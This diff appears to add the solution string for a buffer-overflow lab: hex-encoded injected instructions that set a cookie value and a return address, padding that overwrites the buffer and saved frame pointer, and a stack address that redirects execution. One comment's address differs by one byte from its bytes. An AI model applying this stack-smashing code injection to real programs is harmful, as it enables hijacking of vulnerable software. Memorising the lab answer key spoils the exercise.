@@ -1,0 +1,12 @@
+48 c7 c0 93 e7 83 12 /* mov $0x1283e793,%rax (fix return value as my cookie) */   
+48 83 ec 08 /* subtract rsp back */
+48 c7 04 24 b3 12 40 00 /* movq $0x4012b2,(%rsp) (fix saved return instruction pointer) */
+c3 /* retq */
+
+90 90 90 90 90 
+83 83 83 30 30 
+83 83 83 30 30 
+83 83 83 30 30 
+ /* overriding buffer and the stored ebp */
+
+98 3d 68 55  /* little endian description of this string's location, so that it will be called as an intruction upon return */
